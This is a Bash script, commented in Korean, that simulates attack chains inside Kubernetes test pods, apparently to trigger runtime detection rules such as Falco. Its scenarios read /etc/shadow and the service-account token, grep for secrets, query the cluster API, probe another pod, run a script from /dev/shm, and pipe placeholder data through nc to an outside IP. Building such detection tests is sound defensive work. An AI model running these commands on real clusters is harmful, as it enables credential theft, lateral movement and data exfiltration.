#!/bin/bash
# =============================================
# Pod-ing 공격 시뮬레이션 스크립트
# =============================================
# 사용법: bash attack_demo.sh [시나리오번호]
#   1: credential_theft   (s → c → n → O)
#   2: lateral_movement    (s → k → E → s)
#   3: drop_and_execute    (s → p → b)
#   4: full_killchain      (s → c → k → E → s → c → O)
#   all: 전체 시나리오 순차 실행

set -e

NAMESPACE="default"
VICTIM_POD="victim-web"
TARGET_POD="target-db"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

log() { echo -e "${CYAN}[$(date +%H:%M:%S)] $1${NC}"; }
attack() { echo -e "${RED}[ATTACK] $1${NC}"; }
wait_step() { echo -e "${YELLOW}  ⏳ 다음 단계까지 $1초 대기...${NC}"; sleep $1; }

# ── 사전 준비: 취약한 Pod 배포 ──
setup_pods() {
    log "테스트 Pod 배포 중..."

    # victim-web: 취약한 웹 앱 (공격 시작점)
    kubectl run $VICTIM_POD \
        --image=busybox \
        --restart=Never \
        --labels="app=victim-web,role=frontend" \
        --overrides='{"spec":{"nodeName":"k8s-w1"}}' \
        -- sh -c "
            # 간단한 HTTP 서버 시뮬레이션
            while true; do
                echo 'HTTP/1.1 200 OK\r\n\r\nHello' | nc -l -p 8080 2>/dev/null || true
            done
        " 2>/dev/null || true

    # target-db: 2차 타깃 (측면이동 대상)
    kubectl run $TARGET_POD \
        --image=busybox \
        --restart=Never \
        --labels="app=target-db,role=database" \
        --overrides='{"spec":{"nodeName":"k8s-w1"}}' \
        -- sh -c "
            while true; do
                echo 'DB Ready' | nc -l -p 3306 2>/dev/null || true
            done
        " 2>/dev/null || true

    log "Pod 상태 대기..."
    kubectl wait --for=condition=Ready pod/$VICTIM_POD --timeout=60s 2>/dev/null || true
    kubectl wait --for=condition=Ready pod/$TARGET_POD --timeout=60s 2>/dev/null || true

    echo -e "${GREEN}[OK] Pod 배포 완료${NC}"
    kubectl get pods -o wide | grep -E "$VICTIM_POD|$TARGET_POD"
    echo ""
}

# ── 정리 ──
cleanup() {
    log "테스트 Pod 정리 중..."
    kubectl delete pod $VICTIM_POD $TARGET_POD --ignore-not-found --grace-period=0 --force 2>/dev/null || true
    echo -e "${GREEN}[OK] 정리 완료${NC}"
}

# ═══════════════════════════════════════════
# 시나리오 1: Credential Theft + Exfiltration
#   상태 시퀀스: s → c → n → O
# ═══════════════════════════════════════════
scenario_credential_theft() {
    echo ""
    echo -e "${RED}═══════════════════════════════════════════${NC}"
    echo -e "${RED}  시나리오 1: Credential Theft & Exfil     ${NC}"
    echo -e "${RED}  예상 시퀀스: s → c → n → O              ${NC}"
    echo -e "${RED}═══════════════════════════════════════════${NC}"
    echo ""

    # Step 1: s (Terminal shell in container)
    attack "Step 1: 컨테이너 쉘 진입 (kubectl exec)"
    kubectl exec -it $VICTIM_POD -- sh -c "echo '[*] Shell obtained'"
    wait_step 3

    # Step 2: c (Read sensitive file untrusted)
    attack "Step 2: 민감파일 읽기 (/etc/shadow)"
    kubectl exec -it $VICTIM_POD -- sh -c "cat /etc/shadow"
    wait_step 3

    # Step 3: c (Search Private Keys or Passwords)
    attack "Step 3: 크레덴셜 탐색 (grep for keys)"
    kubectl exec -it $VICTIM_POD -- sh -c "grep -r 'password\|secret\|key' /etc/ 2>/dev/null || true"
    wait_step 3

    # Step 4: n (네트워크 도구 — nc로 외부 연결 시도)
    attack "Step 4: 네트워크 도구로 외부 전송 시도 (nc)"
    kubectl exec -it $VICTIM_POD -- sh -c "echo 'stolen_data' | nc -w 2 1.2.3.4 4444 2>/dev/null || echo '[*] Exfil attempted (blocked)'"
    wait_step 2

    echo -e "${GREEN}[완료] 시나리오 1 종료${NC}"
}

# ═══════════════════════════════════════════
# 시나리오 2: Lateral Movement via K8s API
#   상태 시퀀스: s → c → k → E → s
# ═══════════════════════════════════════════
scenario_lateral_movement() {
    echo ""
    echo -e "${RED}═══════════════════════════════════════════${NC}"
    echo -e "${RED}  시나리오 2: Lateral Movement via API     ${NC}"
    echo -e "${RED}  예상 시퀀스: s → c → k → E → s          ${NC}"
    echo -e "${RED}═══════════════════════════════════════════${NC}"
    echo ""

    # Step 1: s (쉘 진입)
    attack "Step 1: victim Pod 쉘 진입"
    kubectl exec -it $VICTIM_POD -- sh -c "echo '[*] Initial foothold'"
    wait_step 3

    # Step 2: c (SA 토큰 읽기 — 민감파일)
    attack "Step 2: ServiceAccount 토큰 읽기"
    kubectl exec -it $VICTIM_POD -- sh -c "cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo '[*] SA token not found (expected in some configs)'"
    wait_step 3

    # Step 3: k (K8s API 접근 시도)
    attack "Step 3: K8s API Server 접근 시도"
    kubectl exec -it $VICTIM_POD -- sh -c "wget -qO- --no-check-certificate https://kubernetes.default.svc/api/v1/namespaces/default/pods 2>/dev/null || echo '[*] API access attempted'"
    wait_step 3

    # Step 4: E (Pod간 통신 — target으로)
    attack "Step 4: target-db Pod으로 네트워크 접근"
    TARGET_IP=$(kubectl get pod $TARGET_POD -o jsonpath='{.status.podIP}')
    kubectl exec -it $VICTIM_POD -- sh -c "echo 'probe' | nc -w 2 $TARGET_IP 3306 2>/dev/null || echo '[*] Lateral probe to $TARGET_IP'"
    wait_step 3

    # Step 5: s (2차 타깃 쉘 — kubectl exec로 시뮬레이션)
    attack "Step 5: target-db Pod 쉘 진입 (2차 foothold)"
    kubectl exec -it $TARGET_POD -- sh -c "echo '[*] Second foothold on target-db'; whoami"
    wait_step 2

    echo -e "${GREEN}[완료] 시나리오 2 종료${NC}"
}

# ═══════════════════════════════════════════
# 시나리오 3: Drop and Execute
#   상태 시퀀스: s → p → b
# ═══════════════════════════════════════════
scenario_drop_and_execute() {
    echo ""
    echo -e "${RED}═══════════════════════════════════════════${NC}"
    echo -e "${RED}  시나리오 3: Drop and Execute             ${NC}"
    echo -e "${RED}  예상 시퀀스: s → p → b                   ${NC}"
    echo -e "${RED}═══════════════════════════════════════════${NC}"
    echo ""

    # Step 1: s (쉘 진입)
    attack "Step 1: 컨테이너 쉘 진입"
    kubectl exec -it $VICTIM_POD -- sh -c "echo '[*] Shell obtained'"
    wait_step 3

    # Step 2: p (패키지 설치 시도 — busybox에서는 실패하지만 Falco는 탐지)
    attack "Step 2: 패키지 매니저 실행 시도"
    kubectl exec -it $VICTIM_POD -- sh -c "apk add curl 2>/dev/null || apt-get install -y curl 2>/dev/null || echo '[*] Package install attempted'"
    wait_step 3

    # Step 3: b (바이너리 드롭 + 실행 시뮬레이션)
    attack "Step 3: /dev/shm에 바이너리 드롭 및 실행"
    kubectl exec -it $VICTIM_POD -- sh -c "echo '#!/bin/sh' > /dev/shm/payload.sh && chmod +x /dev/shm/payload.sh && /dev/shm/payload.sh 2>/dev/null || echo '[*] Payload executed from /dev/shm'"
    wait_step 2

    echo -e "${GREEN}[완료] 시나리오 3 종료${NC}"
}

# ═══════════════════════════════════════════
# 시나리오 4: Full Kill Chain
#   상태 시퀀스: s → c → k → E → s → c → n → O
# ═══════════════════════════════════════════
scenario_full_killchain() {
    echo ""
    echo -e "${RED}═══════════════════════════════════════════════${NC}"
    echo -e "${RED}  시나리오 4: Full Kill Chain                   ${NC}"
    echo -e "${RED}  예상: s → c → k → E → s → c → n → O         ${NC}"
    echo -e "${RED}═══════════════════════════════════════════════${NC}"
    echo ""

    attack "Phase 1: Initial Access on victim-web"
    kubectl exec -it $VICTIM_POD -- sh -c "echo '[*] Initial access'"
    wait_step 2

    attack "Phase 2: Credential Harvesting"
    kubectl exec -it $VICTIM_POD -- sh -c "cat /etc/shadow; cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || true"
    wait_step 3

    attack "Phase 3: K8s API Reconnaissance"
    kubectl exec -it $VICTIM_POD -- sh -c "wget -qO- --no-check-certificate https://kubernetes.default.svc/api/v1/namespaces 2>/dev/null || echo '[*] API recon'"
    wait_step 3

    attack "Phase 4: Lateral Movement to target-db"
    TARGET_IP=$(kubectl get pod $TARGET_POD -o jsonpath='{.status.podIP}')
    kubectl exec -it $VICTIM_POD -- sh -c "echo 'probe' | nc -w 2 $TARGET_IP 3306 2>/dev/null || true"
    wait_step 3

    attack "Phase 5: Second Foothold"
    kubectl exec -it $TARGET_POD -- sh -c "echo '[*] Compromised target-db'"
    wait_step 2

    attack "Phase 6: Data Theft on target-db"
    kubectl exec -it $TARGET_POD -- sh -c "cat /etc/shadow"
    wait_step 3

    attack "Phase 7: Exfiltration"
    kubectl exec -it $TARGET_POD -- sh -c "echo 'exfil_data' | nc -w 2 1.2.3.4 8443 2>/dev/null || echo '[*] Exfil attempted'"
    wait_step 2

    echo -e "${GREEN}[완료] 시나리오 4 (Full Kill Chain) 종료${NC}"
}

# ── 메인 ──
case "${1:-help}" in
    setup)
        setup_pods
        ;;
    cleanup)
        cleanup
        ;;
    1|credential)
        scenario_credential_theft
        ;;
    2|lateral)
        scenario_lateral_movement
        ;;
    3|drop)
        scenario_drop_and_execute
        ;;
    4|full)
        scenario_full_killchain
        ;;
    all)
        setup_pods
        sleep 5
        scenario_credential_theft
        sleep 5
        scenario_lateral_movement
        sleep 5
        scenario_drop_and_execute
        sleep 5
        scenario_full_killchain
        cleanup
        ;;
    *)
        echo "사용법: $0 {setup|cleanup|1|2|3|4|all}"
        echo ""
        echo "  setup    : 테스트 Pod 배포"
        echo "  cleanup  : 테스트 Pod 정리"
        echo "  1        : Credential Theft (s→c→n→O)"
        echo "  2        : Lateral Movement (s→c→k→E→s)"
        echo "  3        : Drop & Execute (s→p→b)"
        echo "  4        : Full Kill Chain (s→c→k→E→s→c→n→O)"
        echo "  all      : 전체 (setup → 1~4 → cleanup)"
        ;;
esac
